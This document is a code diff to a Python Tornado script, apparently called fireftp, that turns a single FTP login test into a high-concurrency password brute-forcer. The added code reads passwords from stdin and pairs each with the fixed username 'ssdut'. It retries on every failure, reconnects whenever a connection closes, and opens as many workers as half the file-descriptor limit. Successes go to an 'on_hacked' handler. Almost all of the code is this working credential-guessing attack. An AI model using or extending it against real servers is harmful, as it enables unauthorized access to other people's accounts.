@@ -9,8 +9,19 @@ from tornado.log import LogFormatter
 import logging
 import tornado
 import socket
+import sys
 
 from ftplib import CRLF
+
+def get_pairs():
+    for i in sys.stdin:
+        yield 'ssdut', i.rstrip('\n')
+
+p = get_pairs()
+
+def get_one():
+    item = p.next()
+    return item
 
 class FtpWorker(object):
     """ 目前只做3件，1. connect 2. 获取welcome 信息 3. 尝试登陆
@@ -22,17 +33,30 @@ class FtpWorker(object):
         logging.debug('FtpWorker init, serv_addr = (%r, %r)' % serv_addr)
         self._recved_lines = []
         self.serv_addr = serv_addr
+        self.setup_connection()
+
+
+    def setup_connection(self):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.stream = IOStream(self.sock)
         self.stream.connect(self.serv_addr, self.on_connected)
+        self.stream.set_close_callback(self.on_connection_close)
+
+    def on_connection_close(self):
+        try:
+            self.sock.close()
+        except:
+            pass
+        self.setup_connection()
 
     def on_connected(self):
         logging.debug('connected, serv_addr = %s' % repr(self.serv_addr))
         self.read_until_multi_line(self.on_welcome)
 
     def on_welcome(self, msg):
-        logging.info('get welcome msg succeeded, msg = %r' % msg)
-        self.try_login('testuser', 'testpw')
+        logging.debug('get welcome msg succeeded, msg = %r' % msg)
+        u, p = get_one()
+        self.try_login(u, p)
 
     def read_until_line(self, callback):
         def _callback(data):
@@ -43,7 +67,7 @@ class FtpWorker(object):
                 line = data[:-2]
             elif data[-1:] in CRLF:
                 line = data[:-1]
-            logging.info('line recved: %r, callback = %r will be called' % (line, callback))
+            logging.debug('line recved: %r, callback = %r will be called' % (line, callback))
             callback(line)
         self.stream.read_until('\n', _callback)
 
@@ -52,11 +76,11 @@ class FtpWorker(object):
             if data[:3] == code and data[3:4] != '-':
                 self._recved_lines.append(data)
                 joined = '\n'.join(self._recved_lines)
-                logging.info('line with code recved: data = %r, code = %r, callback = %r will be called' % (data, code, callback))
+                logging.debug('line with code recved: data = %r, code = %r, callback = %r will be called' % (data, code, callback))
                 callback(joined)
                 self._recved_lines = []
             else:
-                logging.info('line recved, but no code in it: data = %r, code = %r' % (data, code))
+                logging.debug('line recved, but no code in it: data = %r, code = %r' % (data, code))
                 self._recved_lines.append(data)
                 self.read_until_line(_on_line)
         self.read_until_line(_on_line)
@@ -66,10 +90,10 @@ class FtpWorker(object):
             if data[3:4] == '-':
                 code = data[:3]
                 self._recved_lines.append(data)
-                logging.info('1st line of multi recved: data = %r, code = %r' % (data, code))
+                logging.debug('1st line of multi recved: data = %r, code = %r' % (data, code))
                 self.read_until_line_with_code(callback, code, callback)
             else:
-                logging.info('1st line of multi recved: data = %r, callback = %r will be called' % (data, callback))
+                logging.debug('1st line of multi recved: data = %r, callback = %r will be called' % (data, callback))
                 callback(data)
                 self._recved_lines = []
         self.read_until_line(_on_first_line)
@@ -93,7 +117,9 @@ class FtpWorker(object):
             passwd = passwd + 'anonymous@'
 
         def _on_fail(resp):
-            logging.error("login fail: resp = %r" % resp)
+            logging.error("login fail: (%r, %r, %r), server_response = %r" % (user, passwd, acct, resp))
+            u, p = get_one()
+            self.try_login(u, p)
 
         def _on_succ(resp):
             self.on_hacked(user, passwd, acct)
@@ -126,8 +152,13 @@ class FtpWorker(object):
 class Bomber(object):
     """ 下一步实现这个 """
     def __init__(self):
-        self.worker = FtpWorker(('127.0.0.1', 5000), self)
+        self.workers = [FtpWorker(('127.0.0.1', 5000), self) for i in range(self.get_resonable_worker_num())]
         self._setup_log()
+
+    def get_resonable_worker_num(self):
+        """可打开文件总数的1/2"""
+        import resource
+        return int(resource.getrlimit(resource.RLIMIT_NOFILE)[0]/2)
 
     def fire_out(self):
         tornado.ioloop.IOLoop.instance().start()
@@ -138,7 +169,7 @@ class Bomber(object):
 
     def _setup_log(self):
         """ setup my own logger, as ./fireftp.log """
-        self._enable_pretty_logging(logging.DEBUG, "./fireftp.log")
+        self._enable_pretty_logging(logging.INFO, "./fireftp.log")
 
 
     def _enable_pretty_logging(self, level, log_file_prefix,
